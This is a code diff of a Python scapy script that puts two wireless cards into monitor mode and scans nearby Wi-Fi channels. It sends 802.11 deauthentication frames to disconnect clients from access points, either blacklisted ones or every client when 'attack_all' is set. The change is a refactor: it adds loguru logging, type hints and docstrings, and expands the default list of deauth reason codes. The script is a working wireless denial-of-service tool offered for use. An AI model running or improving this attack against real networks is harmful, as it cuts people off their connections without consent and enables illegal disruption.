@@ -1,20 +1,25 @@
 import argparse
 import subprocess
 import time
-import logging
-from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth
+import sys
+from typing import List, Tuple
+from loguru import logger
+from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth, Dot11Elt
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11Elt
 
 # Constants
 INTERFACE_MONITOR_1 = "wlan1"
 INTERFACE_MONITOR_2 = "wlan2"
 
-# Setup logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Remove default handler and configure loguru to log to stdout
+logger.remove()
+logger.add(sys.stdout, format="{time} - {level} - {message}", level="INFO")
+
 
 # Initialize arguments
 parser = argparse.ArgumentParser(description="Deauth unwanted users from Wi-Fi network.")
-parser.add_argument("--death_reasons", nargs='+', type=int, default=[1], help="List of deauth codes to be sent sequentially to the target.")
+parser.add_argument("--death_reasons", nargs='+', type=int, default=[1, 2, 3, 4, 6, 7, 8, 10], help="List of deauth codes to be sent sequentially to the target.")
 parser.add_argument("--death_seq", type=int, default=1, help="Number of packets for each reason to be sent at once.")
 parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking.")
 parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking.")
@@ -25,33 +30,47 @@ parser.add_argument("--channel_list", nargs='+', type=int, required=True, help="
 parser.add_argument("--channel_wait", type=int, default=1, help="For how long to stay on a selected channel before hopping.")
 args = parser.parse_args()
 
-def set_monitor_mode(interface):
-    """Sets the specified wireless interface to monitor mode."""
+
+def set_monitor_mode(interface: str) -> None:
+    """
+    Sets the specified wireless interface to monitor mode.
+    
+    :param interface: The name of the wireless interface.
+    """
     try:
-        logging.info(f"Setting {interface} to monitor mode")
+        logger.info(f"Setting {interface} to monitor mode")
         subprocess.run(["ifconfig", interface, "down"], check=True)
         subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
         subprocess.run(["ifconfig", interface, "up"], check=True)
     except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to set monitor mode on {interface}: {e}")
+        logger.error(f"Failed to set monitor mode on {interface}: {e}")
 
-def set_channel(interface, channel):
-    """Sets the specified wireless interface to the given channel."""
+
+def set_channel(interface: str, channel: int) -> None:
+    """
+    Sets the specified wireless interface to the given channel.
+    
+    :param interface: The name of the wireless interface.
+    :param channel: The channel number to set.
+    """
     try:
-        logging.info(f"Setting {interface} to channel {channel}")
+        logger.info(f"Setting {interface} to channel {channel}")
         subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
     except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to set channel {channel} on {interface}: {e}")
+        logger.error(f"Failed to set channel {channel} on {interface}: {e}")
 
-def scan_networks(interface):
+
+def scan_networks(interface: str) -> Tuple[List[Tuple[str, str]], List[str]]:
     """
     Scans for networks and connected clients on the specified interface.
-    Returns a list of APs and clients.
+    
+    :param interface: The name of the wireless interface.
+    :return: A tuple containing a list of APs (each as a tuple of SSID and BSSID) and a list of client MAC addresses.
     """
-    ap_list = []
-    client_list = []
+    ap_list: List[Tuple[str, str]] = []
+    client_list: List[str] = []
 
-    def packet_handler(pkt):
+    def packet_handler(pkt) -> None:
         if pkt.haslayer(Dot11):
             bssid = pkt.addr2.lower() if pkt.addr2 else ''
             if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
@@ -64,44 +83,62 @@ def scan_networks(interface):
                     client_list.append(client)
 
     try:
-        logging.info(f"Scanning networks on {interface}")
+        logger.info(f"Scanning networks on {interface}")
         sniff(iface=interface, prn=packet_handler, timeout=10, store=0)
     except Exception as e:
-        logging.error(f"Error while scanning networks: {e}")
+        logger.error(f"Error while scanning networks: {e}")
     return ap_list, client_list
 
-def create_deauth_packet(src, dst, bssid, reason):
+
+def create_deauth_packet(src: str, dst: str, bssid: str, reason: int) -> RadioTap:
     """
     Creates a deauthentication packet.
-    Returns the created packet.
+    
+    :param src: Source MAC address (client or AP sending the deauth).
+    :param dst: Destination MAC address (client or AP receiving the deauth).
+    :param bssid: BSSID of the AP.
+    :param reason: Reason code for the deauth.
+    :return: The created deauthentication packet.
     """
     dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
     return RadioTap() / dot11 / Dot11Deauth(reason=reason)
 
-def send_deauth_packets(interface, target, bssid, reasons, seq):
+
+def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[int], seq: int) -> None:
     """
     Sends deauthentication packets to the target.
+    
+    :param interface: The name of the wireless interface.
+    :param target: The target MAC address to deauth.
+    :param bssid: The BSSID of the AP.
+    :param reasons: List of reason codes to be sent.
+    :param seq: Number of packets for each reason to be sent at once.
     """
     try:
         for reason in reasons:
             packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
             sendp(packet, iface=interface, count=seq, inter=0.1, verbose=0)
-            logging.info(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
+            logger.info(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
     except Exception as e:
-        logging.error(f"Error while sending deauth packets: {e}")
+        logger.error(f"Error while sending deauth packets: {e}")
 
-def deauth_process():
+
+def deauth_process() -> None:
     """
     Main process for performing deauthentication attacks.
     """
+    if not args.channel_list:
+        logger.error("Channel list is empty. At least one channel must be provided.")
+        return
+    
     while True:
         for channel in args.channel_list:
-            logging.info(f"Switching to channel {channel}")
+            logger.info(f"Switching to channel {channel}")
             set_channel(INTERFACE_MONITOR_1, channel)
             set_channel(INTERFACE_MONITOR_2, channel)
 
             ap_list, client_list = scan_networks(INTERFACE_MONITOR_1)
-            logging.info(f"Found {len(ap_list)} APs and {len(client_list)} clients on channel {channel}")
+            logger.info(f"Found {len(ap_list)} APs and {len(client_list)} clients on channel {channel}")
 
             for ssid, bssid in ap_list:
                 if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
@@ -111,25 +148,28 @@ def deauth_process():
                         if client in args.whitelist_client:
                             continue
                         if args.attack_all or client in args.blacklist_client:
-                            logging.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
+                            logger.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                             send_deauth_packets(INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.death_reasons, seq=args.death_seq)
 
-            logging.info(f"Waiting {args.channel_wait} seconds before channel hop")
+            logger.info(f"Waiting {args.channel_wait} seconds before channel hop")
             time.sleep(args.channel_wait)
 
-def main():
+
+def main() -> None:
     """
     Entry point for the script. Sets up interfaces and starts the deauth process.
     """
     try:
-        logging.info("Setting interfaces to monitor mode")
+        logger.info("Setting interfaces to monitor mode")
         set_monitor_mode(INTERFACE_MONITOR_1)
         set_monitor_mode(INTERFACE_MONITOR_2)
         deauth_process()
     except KeyboardInterrupt:
-        logging.info("\nInterrupted by user, shutting down...")
+        logger.info("Interrupted by user, shutting down...")
+    except Exception as e:
+        logger.error(f"An error occurred: {e}")
     finally:
-        logging.info("Restoring network interfaces...")
+        logger.info("Restoring network interfaces...")
         try:
             subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "down"], check=True)
             subprocess.run(["iwconfig", INTERFACE_MONITOR_1, "mode", "managed"], check=True)
@@ -138,7 +178,8 @@ def main():
             subprocess.run(["iwconfig", INTERFACE_MONITOR_2, "mode", "managed"], check=True)
             subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "up"], check=True)
         except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to restore network interfaces: {e}")
+            logger.error(f"Failed to restore network interfaces: {e}")
+
 
 if __name__ == "__main__":
     main()
